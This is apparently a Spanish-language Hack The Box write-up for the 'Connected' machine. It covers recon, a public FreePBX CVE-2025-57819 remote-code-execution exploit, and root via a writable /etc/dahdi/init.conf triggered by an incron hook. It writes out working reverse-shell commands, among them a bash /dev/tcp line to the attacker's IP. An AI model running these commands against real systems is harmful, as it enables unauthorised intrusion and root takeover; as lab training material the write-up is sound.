# Connected
- htb
- ping -c1 10.129.112.183 para ver conecntividad 1 intento.
- nmap -sCV -Pn 10.129.112.183 para ver que puertos tenemos que hay.
- 22 -> ssh / 80 -> http / 443 -> https
- Si entramos mediante http -> http://connected.htb/ redirige a esto, vamoss a añadirlo a nuestro dns local de la máquina para que resuelva el dns.
- sudo nano /etc/hosts -> 10.129.112.183 connected.htb
- http://connected.htb/admin/config.php nos trae al archivo de configuración de admin un panel.
- veo una key suelta einqgiq5d4gccva8rk0rg6pafs la guardo.
- FreePBX 16.0.40.7 es una gui permite gestionar telefonia ip. ( tenemos la versión :) )
- ffuf -u http://connected.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt fuzzeamos la web por ssis podemos encontrar algo mas.
- encontramos robots.txt entramos a ver ->

- # This robots.txt file requests that search engines and other
# automated web-agents don't try to index the files in this
# directory (/www/images/).
#
# This file is included in the event that an installation has in-appropriately
# exposed their GUI to the outside internet as it will help to stop 
# the indexing of their system.
#
User-agent: *
Disallow: /

-la web tiene diferentes opciones administsracion pide user y el resto no carga.
- Probamos a ver si hay cve con esa verison de freepbx y encuentro el repo -> https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE
- python3 exploit.py --rhost connected.htb --command "id" para ejecutar el exploit y comprobamoss que funciona.
- python3 exploit.py --rhost connected.htb --lhost 10.10.14.11 --lport 4444 para enviarnos una reverse shell.
- whoami y ya esstamos dentro de la máquina como assterissk@connected
- entramos en directorio personal y pillamos la flag user.txt
- python -c 'import pty; pty.spawn("/bin/bash")' para tener una tty
- y ahora sudo -l y me pide contraseña de asterisk.
- buscamos otra manera de esscalar privilegios -> find / -perm -4000 -type f 2>/dev/null -> nada.
- buscamos por capabiliteies -> getcap -r / 2>/dev/null nada tampoco.
- find /etc -name "*.conf" -writable 2>/dev/null miramos por archivos de configuración modificables.
- encuentro -> /etc/dahdi/init.conf -> cat /etc/incron.d/* -> /var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart !!!!
- echo 'bash -c "bash -i >& /dev/tcp/10.10.14.11/4545 0>&1"' >> /etc/dahdi/init.conf añadimos al final reverse shell 4545
- echo "Restart" >> /var/spool/asterisk/sysadmin/dahdi_restart para reiniciar el sistema y qeu se ejecute.
- nc -lnvp 4545 y lanzamos el comando de antes obtenemos shell como root whoamil, cd y pillamos flag.
